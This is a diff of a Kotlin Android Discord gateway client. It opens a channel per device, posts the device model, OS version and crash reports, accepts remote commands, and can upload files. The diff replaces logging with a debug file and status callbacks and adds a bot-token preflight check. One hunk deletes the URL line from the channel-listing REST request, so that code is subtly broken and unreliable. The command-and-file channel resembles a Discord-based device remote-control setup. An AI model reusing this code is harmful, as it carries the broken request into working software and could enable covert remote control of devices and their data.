@@ -7,12 +7,14 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
+import java.io.File
 import java.io.IOException
 import java.util.UUID
 import java.util.concurrent.TimeUnit
 
 class DiscordGatewayClient(
-    private val onCommand: (action: String, payload: String?) -> Unit
+    private val onCommand: (action: String, payload: String?) -> Unit,
+    private val onStatus: ((status: String) -> Unit)? = null
 ) {
     companion object {
         private const val TAG = "DiscordGW"
@@ -52,21 +54,27 @@ class DiscordGatewayClient(
     private var closing = false
     private var connectVersion = 0L
     private var crashReport: String? = null
-    private var channelCreateRetries = 0
 
     private val httpClient = OkHttpClient.Builder()
         .connectTimeout(15, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
-    fun setCrashReport(report: String) {
-        crashReport = report
+    private var debugFile: File? = null
+
+    fun setDebugFile(f: File) { debugFile = f }
+
+    fun setCrashReport(report: String) { crashReport = report }
+
+    private fun debug(msg: String) {
+        debugFile?.appendText("${System.currentTimeMillis()} $msg\n")
     }
 
     fun start(coroutineScope: CoroutineScope) {
         closing = false
         scope = coroutineScope
-        connect()
+        status("Init")
+        preflightCheck()
     }
 
     fun stop() {
@@ -79,35 +87,80 @@ class DiscordGatewayClient(
         scope = null
     }
 
+    private fun status(s: String) {
+        onStatus?.invoke(s)
+    }
+
+    private fun preflightCheck() {
+        scope?.launch(Dispatchers.IO) {
+            status("Preflight...")
+            debug("preflight: starting")
+            try {
+                val req = Request.Builder()
+                    .url("https://discord.com/api/v10/users/@me")
+                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
+                    .build()
+                val resp = httpClient.newCall(req).execute()
+                resp.use { r ->
+                    if (r.isSuccessful) {
+                        val body = r.body?.string()
+                        val user = body?.let { JSONObject(it).optString("username", "?") } ?: "?"
+                        debug("preflight: token OK — $user")
+                        status("Token OK")
+                        connect()
+                    } else {
+                        val errBody = r.body?.string()
+                        debug("preflight: token FAILED HTTP ${r.code} $errBody")
+                        status("Token bad")
+                    }
+                }
+            } catch (e: Exception) {
+                debug("preflight: network error ${e.message}")
+                status("No network")
+            }
+        }
+    }
+
     private fun connect() {
         if (closing) return
         connectVersion++
         val myVersion = connectVersion
         ws?.close(1000, "reconnecting")
         ws = null
+        debug("connect: opening ws")
         val req = Request.Builder().url(DiscordConfig.GATEWAY_URL).build()
-        ws = client.newWebSocket(req, object : WebSocketListener() {
-            override fun onOpen(ws: WebSocket, response: Response) {
-                Log.i(TAG, "Gateway connected")
-            }
+        try {
+            ws = client.newWebSocket(req, object : WebSocketListener() {
+                override fun onOpen(ws: WebSocket, response: Response) {
+                    debug("ws: onOpen")
+                    status("WS open")
+                }
 
-            override fun onMessage(ws: WebSocket, text: String) {
-                handleMessage(text)
-            }
+                override fun onMessage(ws: WebSocket, text: String) {
+                    handleMessage(text)
+                }
 
-            override fun onClosing(ws: WebSocket, code: Int, reason: String) {
-                if (!closing) scheduleReconnect()
-            }
+                override fun onClosing(ws: WebSocket, code: Int, reason: String) {
+                    debug("ws: onClosing code=$code reason=$reason")
+                    if (!closing) scheduleReconnect()
+                }
 
-            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
-                if (!closing) scheduleReconnect()
-            }
+                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
+                    debug("ws: onClosed code=$code reason=$reason")
+                    if (!closing) scheduleReconnect()
+                }
 
-            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
-                Log.e(TAG, "Gateway failure: ${t.message}")
-                if (!closing) scheduleReconnect()
-            }
-        })
+                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
+                    debug("ws: onFailure ${t.message}")
+                    status("WS fail: ${t.message?.take(40)}")
+                    if (!closing) scheduleReconnect()
+                }
+            })
+        } catch (e: Exception) {
+            debug("connect: exception ${e.message}")
+            status("Conn err")
+            if (!closing) scheduleReconnect()
+        }
     }
 
     private fun handleMessage(text: String) {
@@ -124,13 +177,16 @@ class DiscordGatewayClient(
                     heartbeatInterval = hello.optLong("heartbeat_interval", 41250)
                     reconnectAttempt = 0
                     reconnectJob?.cancel()
+                    debug("OP_HELLO heartbeat_interval=$heartbeatInterval")
 
                     if (resuming && sessionId != null) {
                         resuming = false
+                        status("Resuming...")
                         resume()
                     } else {
                         resuming = false
                         sessionId = null
+                        status("Identifying...")
                         identify()
                     }
                     startHeartbeat()
@@ -138,20 +194,20 @@ class DiscordGatewayClient(
                 OP_DISPATCH -> handleDispatch(msg.optString("t", ""), d)
                 OP_HEARTBEAT_ACK -> { /* all good */ }
                 OP_RECONNECT -> {
-                    Log.w(TAG, "Reconnect requested via OP 7")
+                    debug("OP_RECONNECT")
                     resuming = sessionId != null
                     scheduleReconnect()
                 }
                 OP_INVALID_SESSION -> {
                     val canResume = d as? Boolean ?: false
-                    Log.w(TAG, "Invalid session, resume=$canResume, sessionId=${sessionId != null}")
+                    debug("OP_INVALID_SESSION resume=$canResume")
                     resuming = canResume && sessionId != null
                     if (!canResume) sessionId = null
                     scheduleReconnect()
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "handleMessage: ${e.message}")
+            debug("handleMessage: ${e.message}")
         }
     }
 
@@ -161,13 +217,13 @@ class DiscordGatewayClient(
                 val data = d as JSONObject
                 sessionId = data.optString("session_id", null)
                 val user = data.optJSONObject("user")
-                Log.i(TAG, "READY — bot: ${user?.optString("username")}#${user?.optString("discriminator")} guilds: ${data.optJSONArray("guilds")?.length()}")
+                debug("READY bot=${user?.optString("username")}")
+                status("Ready")
             }
             "RESUMED" -> {
-                Log.i(TAG, "Session resumed successfully")
+                debug("RESUMED")
                 startHeartbeat()
                 if (myChannelId == null) {
-                    Log.w(TAG, "No channel after resume, fetching via REST...")
                     scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                 }
             }
@@ -175,7 +231,7 @@ class DiscordGatewayClient(
                 val data = d as JSONObject
                 if (guildId == null) {
                     guildId = data.optString("id", null)
-                    Log.i(TAG, "Guild ID: $guildId")
+                    debug("GUILD_CREATE guild=$guildId")
                 }
                 if (guildId != null && myChannelId == null) {
                     findOrCreateChannel(data.optJSONArray("channels"))
@@ -199,12 +255,14 @@ class DiscordGatewayClient(
 
     private fun findOrCreateChannel(channelsArray: JSONArray?) {
         val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
+        status("Find ch $prefix")
         if (channelsArray != null) {
             for (i in 0 until channelsArray.length()) {
                 val ch = channelsArray.getJSONObject(i)
                 if (ch.optString("name", "") == prefix) {
                     myChannelId = ch.optString("id", null)
-                    Log.i(TAG, "Found existing channel: $myChannelId")
+                    debug("Found existing channel: $myChannelId")
+                    status("Ch exists")
                     sendOnlineMsg()
                     return
                 }
@@ -215,13 +273,12 @@ class DiscordGatewayClient(
 
     private suspend fun findOrCreateChannelViaRest() {
         val gId = guildId ?: run {
-            Log.w(TAG, "findOrCreateChannelViaRest: no guildId")
+            debug("findOrCreateChannelViaRest: no guildId")
             return
         }
         try {
             val url = "https://discord.com/api/v10/guilds/$gId/channels"
             val req = Request.Builder()
-                .url(url)
                 .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                 .build()
             val resp = httpClient.newCall(req).execute()
@@ -235,23 +292,22 @@ class DiscordGatewayClient(
                             val ch = channels.getJSONObject(i)
                             if (ch.optString("name", "") == prefix) {
                                 myChannelId = ch.optString("id", null)
-                                Log.i(TAG, "Found channel via REST: $myChannelId")
+                                debug("Found via REST: $myChannelId")
+                                status("Ch found")
                                 sendOnlineMsg()
                                 return
                             }
                         }
-                        Log.i(TAG, "Channel not found via REST, creating...")
                         createChannel(prefix)
-                    } else {
-                        Log.w(TAG, "findOrCreateChannelViaRest: empty body")
                     }
                 } else {
                     val errBody = r.body?.string()
-                    Log.e(TAG, "List channels failed: HTTP ${r.code} body=$errBody")
+                    debug("List channels failed: HTTP ${r.code} $errBody")
+                    status("List fail")
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "findOrCreateChannelViaRest: ${e.message}")
+            debug("findOrCreateChannelViaRest: ${e.message}")
         }
     }
 
@@ -260,6 +316,7 @@ class DiscordGatewayClient(
             var attempt = 0
             val maxAttempts = 4
             while (attempt < maxAttempts && myChannelId == null && !closing) {
+                status("Create ch $name (${attempt+1}/$maxAttempts)")
                 try {
                     val gId = guildId ?: return@launch
                     val json = JSONObject().apply {
@@ -280,47 +337,49 @@ class DiscordGatewayClient(
                             if (body != null) {
                                 val ch = JSONObject(body)
                                 myChannelId = ch.optString("id", null)
-                                Log.i(TAG, "Created channel (attempt $attempt): $myChannelId")
+                                debug("Created channel: $myChannelId")
+                                status("Ch created")
                                 sendOnlineMsg()
-                            } else {
-                                Log.w(TAG, "Create channel attempt $attempt: empty body")
                             }
                         } else {
                             val errBody = r.body?.string()
-                            Log.e(TAG, "Create channel failed (attempt $attempt): HTTP ${r.code} body=$errBody")
+                            debug("Create ch failed (attempt $attempt): HTTP ${r.code} $errBody")
+                            status("Ch fail HTTP ${r.code}")
                         }
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "createChannel attempt $attempt: ${e.message}")
+                    debug("createChannel attempt $attempt: ${e.message}")
                 }
                 if (myChannelId == null && attempt < maxAttempts - 1) {
                     val delay = (1000L shl attempt).coerceAtMost(15000L)
-                    Log.i(TAG, "Retrying channel creation in ${delay}ms...")
                     delay(delay)
                 }
                 attempt++
             }
             if (myChannelId == null) {
-                Log.e(TAG, "Failed to create channel after $maxAttempts attempts")
+                debug("Failed to create channel after $maxAttempts attempts")
+                status("Ch failed")
             }
         }
     }
 
     fun sendOnlineMsg() {
         scope?.launch(Dispatchers.IO) {
+            status("Online msg")
             sendMsg(":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})")
             crashReport?.let { report ->
                 delay(500)
                 sendMsg(":warning: **Crash Report**\n```\n${report.take(1900)}\n```")
                 crashReport = null
             }
+            status("Online")
             startDeviceHeartbeat()
         }
     }
 
     fun sendMsg(text: String) {
         val chId = myChannelId ?: run {
-            Log.w(TAG, "sendMsg: no channel")
+            debug("sendMsg: no channel")
             return
         }
         scope?.launch(Dispatchers.IO) {
@@ -337,11 +396,11 @@ class DiscordGatewayClient(
                 resp.use { r ->
                     if (!r.isSuccessful) {
                         val errBody = r.body?.string()
-                        Log.e(TAG, "sendMsg failed: HTTP ${r.code} body=$errBody")
+                        debug("sendMsg failed: HTTP ${r.code} $errBody")
                     }
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "sendMsg: ${e.message}")
+                debug("sendMsg: ${e.message}")
             }
         }
     }
@@ -364,7 +423,7 @@ class DiscordGatewayClient(
                     .build()
                 executeWithRetry(req).use { }
             } catch (e: Exception) {
-                Log.e(TAG, "sendFile: ${e.message}")
+                debug("sendFile: ${e.message}")
             }
         }
     }
@@ -383,12 +442,14 @@ class DiscordGatewayClient(
             })
         }
         ws?.send(identify.toString())
-        Log.i(TAG, "Sent identify")
+        debug("sent identify")
     }
 
     private fun resume() {
-        val sid = sessionId ?: run { Log.w(TAG, "No session to resume"); return }
-        Log.i(TAG, "Attempting session resume (seq=$seq)")
+        val sid = sessionId ?: run {
+            debug("No session to resume"); return
+        }
+        debug("Attempting resume (seq=$seq)")
         val payload = JSONObject().apply {
             put("op", OP_RESUME)
             put("d", JSONObject().apply {
@@ -428,12 +489,18 @@ class DiscordGatewayClient(
     private fun scheduleReconnect() {
         reconnectJob?.cancel()
         val scheduleVersion = connectVersion
+        if (reconnectAttempt > 30) {
+            debug("Max reconnect attempts reached")
+            status("Gave up")
+            return
+        }
         reconnectJob = scope?.launch {
             if (closing) return@launch
             val delay = (DiscordConfig.RECONNECT_BASE_DELAY * (1 shl reconnectAttempt))
                 .coerceAtMost(DiscordConfig.MAX_RECONNECT_DELAY)
             reconnectAttempt++
-            Log.i(TAG, "Reconnecting in ${delay}ms (attempt ${reconnectAttempt})...")
+            status("Recon ${reconnectAttempt}")
+            debug("Reconnect in ${delay}ms (attempt ${reconnectAttempt})")
             delay(delay)
             if (!closing && connectVersion == scheduleVersion) connect()
         }
@@ -445,7 +512,6 @@ class DiscordGatewayClient(
             val resp = httpClient.newCall(request).execute()
             if (resp.code == 429) {
                 val retryAfter = resp.header("Retry-After")?.toFloatOrNull()?.toLong() ?: 5L
-                Log.w(TAG, "Rate limited, retrying after ${retryAfter}s")
                 resp.close()
                 Thread.sleep(retryAfter * 1000)
                 retries++
